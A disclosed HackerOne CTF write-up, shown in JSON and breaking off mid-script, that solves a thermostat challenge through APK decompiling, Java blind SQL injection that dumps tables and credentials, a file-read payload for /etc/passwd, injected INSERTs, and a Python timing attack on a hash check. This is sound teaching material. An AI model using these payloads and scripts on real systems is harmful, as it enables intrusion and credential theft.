{"id":514664,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MTQ2NjQ=","url":"https://hackerone.com/reports/514664","title":"$50 million CTF Writeup","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2019-03-25T02:28:13.947Z","submitted_at":"2019-03-25T02:28:13.947Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"manoelt","url":"/manoelt","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/008/480/8ae9c94cfb10480af6e9c72f7989077b9c2d746a_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":38489,"url":"https://hackerone.com/50m-ctf","handle":"50m-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"50m-ctf","twitter_handle":null,"website":"https://hackerone.com/","about":null}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-04-08T15:57:42.920Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-04-08T15:57:36.236Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\n\nFor a brief overview of the challenge you can take a look at the following image:\n\n{F451370}\n\nBelow I will detail each step that I took to solve the CTF, moreover all the bad assumptions that led me to a dead end in some cases.\n\n## Twitter\n\nThe CTF begins with this tweet:\n\n{F451371}\n\n### What is this binary?\n\n{F451365}\n\nMy first thought was try to decode the binary on image’s background. I also noted that after the ‘_’ character the binary numbers were repeating the same sequence, which was:\n\n`01111010 01101100 01101001 01100010 00101011 01111000 10011100 01001011 11001010 00101100 11010001 01001011 11001001 11010111 11001111 00110000 00101100 11001001 01001000 00101101 11001010 00000101 00000000 00100101 11010010 00000101 00101001`\n\nSo let’s see if this lead to any ascii word or something readable:\n\n```python\n\u003e\u003e\u003e bin_array_image = ['0b01111010', '0b01101100', '0b01101001', '0b01100010', '0b00101011', '0b01111000', '0b10011100', '0b01001011', '0b11001010', '0b00101100', '0b11010001', '0b01001011', '0b11001001', '0b11010111', '0b11001111', '0b00110000', '0b00101100', '0b11001001', '0b01001000', '0b00101101', '0b11001010', '0b00000101', '0b00000000', '0b00100101', '0b11010010', '0b00000101', '0b00101001']\n\u003e\u003e\u003e s = ''.join(chr(int(x,2)) for x in bin_array_image)\n\u003e\u003e\u003e print(s)\nzlib+xKÊ,ÑKÉ×Ï0,ÉH-Ê\u0005 %Ò\u0005)\n```\n\nNice, the first five chars are: `zlib+`. So, maybe we should use zlib to decompress the remaining bytes.\n\n```python\n\u003e\u003e\u003e import zlib\n\u003e\u003e\u003e byte_string = bytes([int(x,2) for x in bin_array_image][5:])\n\u003e\u003e\u003e print(zlib.decompress(byte_string))\nb'bit.do/h1therm'\n```\n\nOk. Now we have an URL that redirects to an APK file in Google Drive. Let's download it.\n\n## APK\n\nAs my first step, I used JADX [3] to decompile the app and start to inspect the code:\n\n{F451367}\n\nReading AndroidManifest.xml I could identify two activity classes: `com.hackerone.thermostat.LoginActivity` and `com.hackerone.thermostat.ThermostatActivity`.\n\n### LoginActivity.class\n\nThe core functionality of LoginActivity is to authenticate the user:\n\n```java\nprivate void attemptLogin() throws Exception {\n    ...\n    JSONObject jSONObject = new JSONObject();\n    jSONObject.put(\"username\", username);\n    jSONObject.put(\"password\", password);\n    jSONObject.put(\"cmd\", \"getTemp\");\n    Volley.newRequestQueue(this).add(new PayloadRequest(jSONObject, new Listener\u003cString\u003e() {\n        public void onResponse(String str) {\n            if (str == null) {\n                LoginActivity.this.loginSuccess();\n                return;\n            }\n            LoginActivity.this.showProgress(false);\n            LoginActivity.this.mPasswordView.setError(str);\n            LoginActivity.this.mPasswordView.requestFocus();\n        }\n    }));\n```\n\nIn `attemptLogin` the App builds a json object like this: `{\"username\": \"\", \"password\": \"\", \"cmd\": \"getTemp\"}` and then instantiates a  `PayloadRequest` object which will be added to a Volley Queue to be processed. So let's see what does this class do.\n\n### PayloadRequest.class\n\n```java\npublic class PayloadRequest extends Request\u003cString\u003e {\n     public PayloadRequest(JSONObject jSONObject, final Listener\u003cString\u003e listener) throws Exception {\n        super(1, \"http://35.243.186.41/\", new ErrorListener() {\n            public void onErrorResponse(VolleyError volleyError) {\n                listener.onResponse(\"Connection failed\");\n            }\n        });\n        this.mListener = listener;\n        this.mParams.put(\"d\", buildPayload(jSONObject));\n    }\n    ...\n```\n\nFrom here we could note an URL `http://35.243.186.41/` which probably is being used as the backend server. Also, there is a method called `buildPayload` which will be the value for `d` parameter.\n\n```java\nprivate String buildPayload(JSONObject jSONObject) throws Exception {\n        SecretKeySpec secretKeySpec = new SecretKeySpec(new byte[]{(byte) 56, (byte) 79, (byte) 46, (byte) 106, (byte) 26, (byte) 5, (byte) -27, (byte) 34, (byte) 59, Byte.MIN_VALUE, (byte) -23, (byte) 96, (byte) -96, (byte) -90, (byte) 80, (byte) 116}, \"AES\");\n        byte[] bArr = new byte[16];\n        new SecureRandom().nextBytes(bArr);\n        IvParameterSpec ivParameterSpec = new IvParameterSpec(bArr);\n        Cipher instance = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n        instance.init(1, secretKeySpec, ivParameterSpec);\n        byte[] doFinal = instance.doFinal(jSONObject.toString().getBytes());\n        byte[] bArr2 = new byte[(doFinal.length + 16)];\n        System.arraycopy(bArr, 0, bArr2, 0, 16);\n        System.arraycopy(doFinal, 0, bArr2, 16, doFinal.length);\n        return Base64.encodeToString(bArr2, 0);\n    }\n```\n\nThe `buildPayload` method uses a symmetric-key algorithm [4] (AES) in CBC mode that uses the same cryptographic key for both encryption of plaintext and decryption of ciphertext. Moreover, the `secretKeySpec` is the key and PKCS#5 is the padding method. Thus our json is always sent encrypted to the backend server. Futhermore, there is a method to decript the response, called `parseNetworkResponse`, which uses the same algorithm and secret key.\n\n### ThermostatActivity.class\n\nThe other ActivityClass is the `ThermostatActivity` which calls `setTargetTemperature` two times and updates the `thermostatModel` attribute. Also using the same json object from `LoginActivity` sends a `getTemp` command, but as you can see, does nothing with the result (`String str`)\n\n```java\n    private void setDefaults(final ThermostatModel thermostatModel) throws Exception {\n        thermostatModel.setTargetTemperature(Integer.valueOf(77));\n        thermostatModel.setCurrentTemperature(Integer.valueOf(76));\n        JSONObject jSONObject = new JSONObject();\n        jSONObject.put(\"username\", LoginActivity.username);\n        jSONObject.put(\"password\", LoginActivity.password);\n        jSONObject.put(\"cmd\", \"getTemp\");\n        volleyQueue.add(new PayloadRequest(jSONObject, new Listener\u003cString\u003e() {\n            public void onResponse(String str) {\n                thermostatModel.setTargetTemperature(Integer.valueOf(70));\n                thermostatModel.setCurrentTemperature(Integer.valueOf(73));\n            }\n        }));\n    }\n```\n\n### com.hackerone.thermostat.Model.ThermostatModel\n\nAnalyzing the other classes we find a `ThermostatModel` with a `setTargetTemperatute` method which gives us another command: `setTemp`. What is interesting about this new command is that now we have a new json attributes `temp` which is the `setTemp` parameter. \n\n```java\n    public void setTargetTemperature(Integer num) {\n        this.targetTemperature.setValue(num);\n        try {\n            JSONObject jSONObject = new JSONObject();\n            jSONObject.put(\"username\", LoginActivity.username);\n            jSONObject.put(\"password\", LoginActivity.password);\n            jSONObject.put(\"cmd\", \"setTemp\");\n            jSONObject.put(\"temp\", num);\n            ThermostatActivity.volleyQueue.add(new PayloadRequest(jSONObject, new Listener\u003cString\u003e() {\n                public void onResponse(String str) {\n                }\n            }));\n        } catch (Exception unused) {\n        }\n        updateCooling();\n    }\n```\n\n### Dir Brute\n\nWhy not? We have an IP running a web server so let's check if we are in a lucky day and get some low hanging fruits figuring out a hidden endpoint. Using FFUF [12]:\n\n```bash\n./ffuf -u http://35.243.186.41/FUZZ -w wordlists/SecLists/Discovery/Web-Content/big.txt\n./ffuf -u http://35.243.186.41/FUZZ -w wordlists/SecLists/Discovery/Web-Content/raft-large-directories-lowercase.txt\n```\n\nNot that easy ...\n\n### Creating a Java Application\n\nAfter this initial recon, it's time to try some attacks interacting with the backend server. For this, I just created a java application using the same source code from the App with minor changes.\n\n```java\n\tpublic static String sendCommand(String username, String password, String cmd) throws Exception {\n\t\treturn PayloadRequest.sendCommand(username, password, cmd, null);\n\t}\n\t\n\tpublic static String sendCommand(String username, String password, String cmd, String tmp) throws Exception {\t\n\t    JSONObject jSONObject = new JSONObject();\n            jSONObject.put(\"username\", username);\n            jSONObject.put(\"password\", password);\n            jSONObject.put(\"cmd\", cmd);\n            if( tmp != null) {\n\t        jSONObject.put(\"temp\", tmp);\n            }\n            return send(jSONObject);\n\t}\n\t\n\tpublic static String send(Object jSONObject) throws Exception {\n\t    String payload = PayloadRequest.buildPayload(jSONObject);\n            URL url = new URL(\"http://35.243.186.41\");\n            HttpURLConnection con = (HttpURLConnection) url.openConnection();\n            con.setRequestMethod(\"POST\");\n        \n            Map\u003cString, String\u003e parameters = new HashMap\u003c\u003e();\n            parameters.put(\"d\", payload);\n            ...\n            return PayloadRequest.parseNetworkResponse(content.toString());\n\t}\n```\n\nSo we are now able to send commands to the backend using the above `sendCommand` method. My first bet here was to try some SQL Injection. But we have some limitations as the server only returns \"Invalid username or password\" or \"Unknown\". First message is received when there is no error but the username and password does not match and the last when something went wrong. With this restriction, we could try two approaches: Time-Based Blind SQL Injection or Error-Based Blind SQL Injection. Let's try time based with the simplest payload:\n\n```java\nSystem.out.println(PayloadRequest.sendCommand(\"'||sleep(10)#\", \"\", \"\"));\n// After 10 seconds ...\n// {\"success\": false, \"error\": \"Invalid username or password\"}\n```\n\n### Time Based SQL Injection\n\nWhat? Did we get it? 10 seconds to get a reponse from the payload above! This is definitely my lucky day ... What I could do now? Maybe a tamper for SQLMap [9]? No, no! This is not so 31337! Let's create our own exploit for blind SQL injection... in Java! First of all, we need to somehow compare two chars and based on response time determine a boolean value: True or False. We can achieve this as follows:\n\n```java\n    public static boolean blindBoolean(String payload) throws Exception {\n        long startTime = System.nanoTime();\n\t\n\tPayloadRequest.sendCommand(payload, \"\", \"\");\n\t\t\n\tlong endTime = System.nanoTime();\n\tlong timeElapsed = endTime - startTime;\t\t\n\treturn (timeElapsed / 1000000) \u003e PayloadRequest.TIME_TO_WAIT * 1000;\t\n    }\n```\n\nTo measure response time we get the time before and after call `sendCommand` then we subtract and compare `TIME_TO_WAIT` with the elapsed time. If elapsed time is greater than `TIME_TO_WAIT` we have a True boolean value otherwise a False value.\n\nNow we need an abstract query for general purpose that allows us to extract data from the database:\n\n`'||(IF((SELECT ascii(substr(column,{1},1)) from table limit {2},1){3}{4},SLEEP({5}),1))#`.\n\nwith:\n```\n{1} -\u003e %d -\u003e string char position\n{2} -\u003e row offset. Limited to 1 result per query\n{3} -\u003e %c -\u003e comparison operator ( =, \u003e, \u003c)\n{4} -\u003e %d -\u003e ascii code value\n{5} -\u003e %d -\u003e time to sleep\n```\n\nAlso to improve the performance we could use a binary search algorithm [5] for our time based boolean check:\n\n```java\n\tpublic static String blindString(String injection, int len) throws Exception {\t\n\t    StringBuilder value = new StringBuilder(\"\");\n\t    for(int c = 1; c \u003c= len; c++) {\n\t        int low = 10;\n\t\tint high = 126;\n\t\tint ort = 0;\n\t\twhile(low\u003chigh) {\n\t\t    if( low-high == 1 ) {\n\t\t        ort = low + 1;\n\t\t    } else if ( low-high == -1 ) {\n\t\t        ort = low;\n\t\t    } else {\n\t\t        ort = (low+high)/2;\n\t\t    }\n\t\t\t\t\n\t\t    String payload = String.format(injection, c, '=', ort, PayloadRequest.TIME_TO_WAIT );\n\t\t    if( PayloadRequest.blindBoolean(payload) ) {\n\t\t        value.append( Character.toString( (char) ort));\n\t\t        break;\n\t            }\n\t\t    payload = String.format(injection, c, '\u003e', ort, PayloadRequest.TIME_TO_WAIT );\n\t\t    if( PayloadRequest.blindBoolean(payload) ) {\n\t\t        low = ort;\n\t            } else {\n\t\t        high = ort;\n\t\t    }\n\t        }\n\t    }\n\t    return value.toString();\n\t}\n```\n\nEverything seems fine enough to start leaking some data:\n\n### Database recon\n\n#### version()\n```java\n\tpublic static String blindVersion() throws Exception {\n\t\tString injection = \"'||(IF((SELECT ascii(substr(version(),%d,1)))%c%d,SLEEP(%d),1))#\";\n\t\treturn PayloadRequest.blindString(injection, 25);\n\t}\n\t// 10.1.37-MariaDB\n```\n\n#### database()\n```java\n\tpublic static String blindDatabase() throws Exception {\n\t\tString injection = \"'||(IF((SELECT ascii(substr(database(),%d,1)))%c%d,SLEEP(%d),1))#\";\n\t\treturn PayloadRequest.blindString(injection, 25);\n\t}\n\t// flitebackend\n```\n\n#### hostname + datadir\n```java\n    System.out.println(blindString(\"'||(IF((SELECT ascii(substr(@@hostname,%d,1)))%c%d,SLEEP(%d),1))#\", 20)); \n    // hostname: de8c6c400a9f\n    System.out.println(blindString(\"'||(IF((SELECT ascii(substr(@@datadir,%d,1)))%c%d,SLEEP(%d),1))#\", 30));\n    // datadir: /var/lib/mysql/\n```\n\n#### Tables\n```java\n\tpublic static String blindTableName(int offset) throws Exception {\n\t\tString injection = \"'||(IF((SELECT ascii(substr(table_name,%d,1)) from information_schema.tables where table_schema=database() limit \"+offset+\",1)%c%d,SLEEP(%d),1))#\";\n\t\treturn PayloadRequest.blindString(injection, 100);\n\t}\n\t...\n\tPayloadRequest.blindTableName(0); // devices\n\tPayloadRequest.blindTableName(1); // users\n\tPayloadRequest.blindTableName(2); // None\n```\n\nTwo tables found: `devices` and `users` in `flitebackend` database.\n\n#### Read files?\nMaybe we could read some files?\n\n```java\n    System.out.println(blindString(\"'||(IF((SELECT ascii(substr(load_file('/etc/hosts'),%d,1)))%c%d,SLEEP(%d),1))#\", 20));\n    System.out.println(blindString(\"'||(IF((SELECT ascii(substr(load_file('/etc/passwd'),%d,1)))%c%d,SLEEP(%d),1))#\", 20));\n```\nI don't think so...\n\n#### Login\nMaybe you are wondering why I didn't log in yet. But I started doing the time-based SQLi before even trying to log in. So let's see if we are able to log in using the SQLi:\n\n```java\n    System.out.println(PayloadRequest.sendCommand(\"' or 1=1#\", \"123123\", \"getTemp\")); \n    // {\"success\": false, \"error\": \"Invalid username or password\"}\n```\n\nHumm, we need to think how the backend is doing the login process:\n1. SELECT username, password FROM users WHERE username='+ username_param +' and password = '+ password_param +' ?\n2. SELECT password FROM table WHERE username='+ username_param +'; then check password?\n\nFor 1 we already know that is not the case because using `' or 1=1#` would give us a successful message.\nFor 2 we need another test, first of all, let's check how many columns the query has.\n\n```java\n    System.out.println(PayloadRequest.sendCommand(\"' order by 1#\", \"\", \"getTemp\")); \n    // {\"success\": false, \"error\": \"Invalid username or password\"}.\n    \n    System.out.println(PayloadRequest.sendCommand(\"' order by 2#\", \"\", \"getTemp\")); \n    // {\"success\": false, \"error\": \"Unknown\"}\n```\n\nOk, based on error message we can affirm that there is only one column on the query. Thus we could try to use `UNION` to fake a successful query:\n\n```java\n    System.out.println(PayloadRequest.sendCommand(\"' union all select ''#\", \"\", \"getTemp\")); \n    // {\"success\": false, \"error\": \"Invalid username or password\"}\n```\n\nNot yet. There is something more... Step back and let's dump users table.\n\n#### users table\n\nFirst, we need to know the table structure. To facilitate the process I created a method called `blindColumnName` with two parameters: `table` and `offset`. This method will dump all columns names from `String table` parameter. \n\n```java\n\tpublic static String blindColumnName(String table, int offset) throws Exception {\n\t\tString injection = \"'||(IF((SELECT ascii(substr(column_name,%d,1)) from information_schema.columns where table_name='\"+table+\"' and table_schema = database() limit \"+offset+\",1)%c%d,SLEEP(%d),1))#\";\n\t\treturn PayloadRequest.blindString(injection, 100);\n\t}\n\t\n\t...\n\tPayloadRequest.blindColumnName(\"users\",0); // id\n\tPayloadRequest.blindColumnName(\"users\",1); // username\n\tPayloadRequest.blindColumnName(\"users\",2); // password\n\tPayloadRequest.blindColumnName(\"users\",3); // None\n\t\n```\n\nusers(id, username, password)\n\n\n#### devices table\n\nThe same process above could be applied to `devices` table.\n\n```java\n    PayloadRequest.blindColumnName(\"devices\",0); // id\n    PayloadRequest.blindColumnName(\"devices\",1); // ip\n    PayloadRequest.blindColumnName(\"devices\",2); // None\n```\ndevices(id, ip)\n\n#### Dumping\n\nKnowing the table structure we could dump the values:\n\n```java\n\tpublic static String blindUsername(int offset) throws Exception {\n\t    String injection = \"'||(IF((SELECT ascii(substr(username,%d,1)) from users limit \"+offset+\",1)%c%d,SLEEP(%d),1))#\";\n\t    return PayloadRequest.blindString(injection, 5);\n\t}\n\t\n\tPayloadRequest.blindUsername(0); // admin\n\tPayloadRequest.blindUsername(1); // None\n\t\n\tpublic static String blindColumnUsersValues(String column, int length) throws Exception {\n\t    String injection = \"'||(IF((SELECT ascii(substr(\"+column+\",%d,1)) from users where username = 'admin')%c%d,SLEEP(%d),1))#\";\n\t    return PayloadRequest.blindString(injection, length);\n\t}\n\t\n\tpublic static String blindPassword() throws Exception {\n\t    return PayloadRequest.blindColumnUsersValues(\"password\", 32);\n\t}\n\t\n\tPayloadRequest.blindPassword(); // 5f4dcc3b5aa765d61d8327deb882cf99\n```\n\nThere is only one user (\"admin\", \"5f4dcc3b5aa765d61d8327deb882cf99\"). Is that a hash? _Googled_ it and found the answer, yes it is: md5('password'). Now we are able to log in using admin:password or even using the sqli:\n\n```java\n    System.out.println(PayloadRequest.sendCommand(\"admin\", \"password\", \"getTemp\"));\n    // {\"temperature\": 73, \"success\": true}\n    System.out.println(PayloadRequest.sendCommand(\"' union all select '47bce5c74f589f4867dbd57e9ca9f808'#\", \"aaa\", \"getTemp\"));\n    // {\"temperature\": 73, \"success\": true}\n```\n\nTime to dump table `devices`. \n\n```java\n\tpublic static String blindIpDevices(int offset) throws Exception {\n\t    String injection = \"'||(IF((SELECT ascii(substr(ip,%d,1)) from devices limit \"+offset+\",1)%c%d,SLEEP(%d),1))#\";\n\t    return PayloadRequest.blindString(injection, 16); // Fixed length\n\t}\n\t...\n\tPayloadRequest.blindIpDevices(0);\n\t// Device: 0\t192.88.99.253\n\tPayloadRequest.blindIpDevices(1);\n\t// Device: 1\t192.88.99.252\n\tPayloadRequest.blindIpDevices(2);\n\t// Device: 2\t10.90.120.23\n```\n\nAfter obtain several ips I noted that most belonged to a private IP address block. My first idea was to build a query removing all private IP addresses and also classes D and E (see `where` clause):\n\n```java\n\tpublic static String blindDeviceQuery() throws Exception {\n\t\tString injection = \"'||(IF((SELECT ascii(substr(ip,%d,1)) from devices where substr(ip,1,2) not in ('24', '25') and substr(ip,1,3) not in ('192', '10.', '198') limit 0,1)%c%d,SLEEP(%d),1))#\";\t\n\t\treturn PayloadRequest.blindString(injection, 16);\n\t}\n\t\n\tPayloadRequest.blindDeviceQuery();\n\t// 104.196.12.98\n```\n\nNice! A real IP address.\n\n## Server 104.196.12.98\n\nFirst recon step here is to run a port scan to discover if there is any service. As a result I got port 80 (http).\n\n```\nStarting masscan 1.0.6 (http://bit.ly/14GZzcT ) at 2019-03-02 22:32:46 GMT\n -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth\nInitiating SYN Stealth Scan\nScanning 1 hosts [65536 ports/host]\nDiscovered open port 22/tcp on 104.196.12.98\nDiscovered open port 80/tcp on 104.196.12.98\n```\n\n{F451369}\n\nNow we are facing a new web application with a form consisting of `username` and `password` inputs. Also reading the source code (html) we can see that there is a `login.js`.  Let's use Burp proxy and do a request submitting the login form. What values could username and password be? From our previous SQL injection, we got admin:password. So it is a good bet:\n\n```\nPOST / HTTP/1.1\nHost: 104.196.12.98\nContent-Length: 68\n\nhash=3af937e7424ef6124f8b321d73a96e737732c2f5727d25c622f6047c1a4392a\n```\n\nAs we can note the post is not sending username and password but a hash. Time to see what `login.js` is doing. Reading the javascript code we can spot a `hash` and a `fhash` functions, leading us to understand that it is a hash algorithm. There is also some padding and XOR bit operations. Almost sure that it is really a hash function and so the backend will be unable to get the original input values (username and password).  In this scenario we can infer that the backend will also compute the hash with the same function, as `login.js`, using the stored username + password. Then it will compare the two hashes. Therefore all we need to be authenticated is a hash.\n\nIs it possible to be another SQL injection? Maybe another type of SQL Injection? At first, all my common payloads didn't work. So in this scenario I decided to run a SQLMap [9], remembering that we are not attacking username and password input fields, but the hash. \n\n```bash\n$ python sqlmap.py -v 3 -u http://104.196.12.98/ --data \"hash=*\" --level=5 --risk=3 --random-agent\n```\n\nResult: Nothing... Maybe we could find another endpoint? Time to use dirseach [7] with some wordlists from SecList [8]:\n\n```\n# ./tools/dirsearch/dirsearch.py -b -t 10 -e php,asp,aspx,jsp,html,zip,jar,sql -x 500,503 -r -w wordlists/raft-large-words.txt -u http://104.196.12.98\n\n _|. _ _  _  _  _ _|_    v0.3.8\n(_||| _) (/_(_|| (_| )\n\nExtensions: php, asp, aspx, jsp, html, zip, jar, sql | Threads: 10 | Wordlist size: 119600\n\nTarget: http://104.196.12.98\n\n[15:00:31] Starting:\n[15:00:35] 302 -  209B  - /update  -\u003e  http://104.196.12.98/\n[15:00:38] 302 -  209B  - /main  -\u003e  http://104.196.12.98/\n[15:00:40] 302 -  209B  - /control  -\u003e  http://104.196.12.98/\n[15:01:10] 302 -  209B  - /diagnostics  -\u003e  http://104.196.12.98/\n```\n\nInteresting, some new endpoints to try. But unfortunately, all of them gave 302 (Found) and redirect (Location) to root (/). Therefore we need to somehow be authenticated.\n\nLet's focus on the hash again ...\n\n### Hash\n\nIt's a good decision to revisit the major hash attacks:\n\n#### Hash Extension? or Hash Colision?\n\nCould it be a hash extension vulnerability? In short hash extension occurs *when a Merkle–Damgård based hash is misused as a message authentication code with construction H(secret ‖ message), and message and the length of secret is known, a length extension attack allows anyone to include extra information at the end of the message and produce a valid hash without knowing the secret*. [10][11] In our scenario this is not applicable as there isn't a signature or message authentication code to be validated.\n\nOr could it be a hash colision? First of all, to be a hash colision we would need a valid hash and this is not the case here.\n\n### What to do now?\n\nAt this moment I was in a hard situation. No ideas... I was sure that something important was left behind. Consequently, I decided to go back and search for more flaws or any kind of relevant information.\n\n#### Maybe a SSRF?\n\nWhat if I could insert another IP into the devices table and use `setTemp` command to change thermostat temperature? Maybe when someone change the temperature all devices will receive a HTTP request with some authorization token and so I could use this to log in. Seems viable. First step is to try `INSERT`:\n\n```java\nSystem.out.println(PayloadRequest.sendCommand(\"';INSERT INTO devices(ip) values('X.X.X.X'); commit#\", \"\", \"getTemp\"));\n```\nOk, it worked. I have my IP address as a device. Now let's run tcpdump [6] on my server (X.X.X.X) to capture all network traffic. Lastly, we need to send some resquests with `getTemp` and `setTemp` commands.\n\n`# tcpdump -i eth0 -nnvvXS`\n\nBut \"nothing\" happens... only a connection (port 80) from someone in San Francisco during h1-415. :) Definitively I should remove my IP address. Dead end here.\n\n#### Create another user?\n\nWe are able to insert any device, maybe we can insert another user and use this as login and password for Thermostat Login.\n\n```java\nSystem.out.println(PayloadRequest.sendCommand(\"';INSERT INTO users(username, password) values('manoelt','e08e9df699ce8d223b8c9375471d6f0f'); commit#\", \"\", \"getTemp\"));\n```\n\nNo. We are not able to log in! :(\n\n#### Another command?\n\nAnd if there is another parameter? Let's brute force it!\n\nAfter some time just popped up a `diag` command with the following response `{\"success\": false, \"error\": \"Missing diagnostic parameters\"}`. Nice, time to brute force parameters name now... After some days trying to guess the parameter for diag command using all sort of wordlists, even using cewl [13] to build specific wordlist from real Thermostats manuals, at the end nothing was found! \n\n### Timing Attack\n\nMaybe I should rewrite the JS code from `login.js` to python and do a code review? Ok... So while doing code review I noted something odd on JS code:\n\n```javascript\nfunction hash(x) {\n\tx += '\\x01\\x00';\n\twhile((x.length \u0026 0xFF) != 0)\n\t\tx += String.fromCharCode((x.length \u0026 0xFF) ^ x.charCodeAt[x.length \u0026 0xFF]);\n\t...\n}\n```\nCan you see it? This is a padding algorithm and the XOR operation is not working as expected, because of this:\n\n`x.charCodeAt[x.length \u0026 0xFF]`\n\nThis is a typo and this wrong piece of code probably makes the hash function unfeasible for a correct validation on the backend server, because we won't ever get the same hash value... This is a good assumption to take!\n\nWhile revisting the attacks against hash functions I saw an interisting topic about Timing Attack: *\"Comparing the hashes in \"length-constant\" time ensures that an attacker cannot extract the hash of a password in an on-line system using a timing attack, then crack it off-line*.\n\n*The standard way to check if two sequences of bytes (strings) are the same is to compare the first byte, then the second, then the third, and so on. As soon as you find a byte that isn't the same for both strings, you know they are different and can return a negative response immediately. If you make it through both strings without finding any bytes that differ, you know the strings are the same and can return a positive result. This means that comparing two strings can take a different amount of time depending on how much of the strings match.* \" [1]\n\nTime to create a PoC for a timing attack. The idea is to send each hash within the range from 0x00 to 0xFF for the first two chars, filled with `ff` until 64 chars in total (padding()). These first two chars represent a byte (hex digest) in the hash. After sending the request we save the time elapsed in a dictionary.\n\n```python\ndef padding(h):\n    r = h + ('f' * (64 - len(h)))\n    return r\n   \ndef send(payload):\n    URL = 'http://104.196.12.98/'\n    r = requests.post(URL, data={'hash':payload})\n    return r.elapsed.total_seconds()\n    \nif __name__ == '__main__':\n    times = {}\n    for x in range(0,0xff):\n        times[format(x, 'x').zfill(2)] = send(padding(format(x, 'x').zfill(2)))\n    print(times)\n```\n\nI got:\n\n```\n{ ...\n    \"ef\": 0.6429750000000001,\n    \"f0\": 0.6428805,\n    \"f1\": 0.6429075,\n    \"f2\": 0.6429579999999999,\n    \"f3\": 0.6426725,\n    \"f4\": 0.6429405000000001,\n    \"f5\": 0.6432635,\n    \"f6\": 0.6427134999999999,\n    \"f7\": 0.6425565,\n    \"f8\": 0.6429004999999999,\n    \"f9\": 1.1436354999999998,\n    \"fa\": 0.6428285,\n    \"fb\": 0.642867,\n    \"fc\": 0.6430150000000001,\n    \"fd\": 0.642695,\n    \"fe\": 0.643376,\n}\n```\nNote that 'f9' took 1.14 seconds, which is 0.5s more than the others. Now I should test the next two chars prefixing `f9` in the hash and so on until I got the complete hash.\n\n#### Multithreading\n\nDoing this timing attack in a single thread would take hours. So we need to do it using multithreading {F451376}. I found out that the most reliable results from my VPS network were using a maximum of 16 threads. The general idea was to build a queue with hex range 0x00 to 0xff and make each thread do a request checking the elapsed time. Being greater than 0.5s from the previous `base_value` time means that we found another \"byte\".\n\nLet's just see the main function that each thread will perform:\n\n```python\ndef process_data(threadName, q): # Thread main function\n    global found\n    while not exitFlag:   # A flag to stop all threads\n        queueLock.acquire()  # Acquire Queue\n        if not workQueue.empty(): \n            payload = q.get()\n            queueLock.release() # Release Queue\n            time_elapsed = send(payload) # Send the hash and get time_elapsed\n            if len(payload) == 64 and time_elapsed == 999: # Last two chars case\n                found = payload\n                return\n\t\t\t\t\n            while time_elapsed - base_time_value \u003e 0.8: # Possibly a network issue\n                time_elapsed = send(payload) # Try again\n\t\t\t\t\n            if (time_elapsed - base_time_value) \u003e 0.4: # Maybe we have found\n                time.sleep((len(found)/2)*0.6+1)   # Waiting to confirm\n\t\t\t\t\n                again = send(payload)   # Confirming\n\t\t\t\t\n                if (again - base_time_value) \u003e 0.45:\n                    found = payload[:len(found)+2] # Found!\n                    print('Found: ' + payload)\n        else:\n            queueLock.release()\n            time.sleep(2)\n     \n```\n\n{F451372}\n\nIf you have extra time you could watch all the full execution here: https://youtu.be/y50QDcvS9OM\n\nFinally we can login using `f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8` as hash.\n\n### Thermostat web app\n\nNow that we are authenticated we can browse the application. All the endpoints are working, except /diagnostics which gives Unauthorized. Further, under /control there is a form to change the temperature by doing a POST to /setTemp. I took some time testing this endpoint sending all kinds of payloads, but it seemed to only accept numbers. (Note: python accepts underscore in numeric literals [14]). \n\n#### /update\n\nWhen we access /update we get:\n\n```\nConnecting to http://update.flitethermostat:5000/ and downloading update manifest\n...\n...\n...\nCould not connect\n```\n\nImmediately this caught my eye. What if there is some hidden parameters? To do this we have a lot of options: Param Miner (Burp), Turbo Intruder (Burp), Parameth, WFuzz, FFUF and so on. As at this time I was looking for performance I choose Turbo Intruder: _Turbo Intruder is a Burp Suite extension for sending large numbers of HTTP requests and analyzing the results. It's intended to complement Burp Intruder by handling attacks that require exceptional speed, duration, or complexity._ [15] Attacks are configured using Python.\n\nRequest:\n```\nGET /update?%s HTTP/1.1\nHost: 104.196.12.98\nCookie: session=eyJsb2dnZWRJbiI6dHJ1ZX0.XIHPog.46NKzPROJLINKkYDyQpOQI27JD0\n```\n\nPython:\n```python\ndef queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint=target.endpoint,\n                           concurrentConnections=20,\n                           requestsPerConnection=40,\n                           pipeline=False\n                           )\n...\t\t\t   \n    for word in open('C:\\\\wordlists\\\\backslash-powered-scanner-params.txt'):\n        engine.queue(target.req, word.strip() + ': turbo.d.mydomain.com.br')\n...\t\ndef handleResponse(req, interesting):\n    table.add(req)\n```\n\nNote that I just set the parameter value to `turbo.d.mydomain.com.br` which if resolved it will also be logged in my DNS. After this, I just sorted the result columns by status code, which showed me `500` for parameter `port`. Nice, we are now able to set the port. Next idea is to try changing the port to all values from 0-65535 and detect another service. Using Turbo Intruder it was easy:\n\n```python\n...\n    for x in range(0,65536):\n    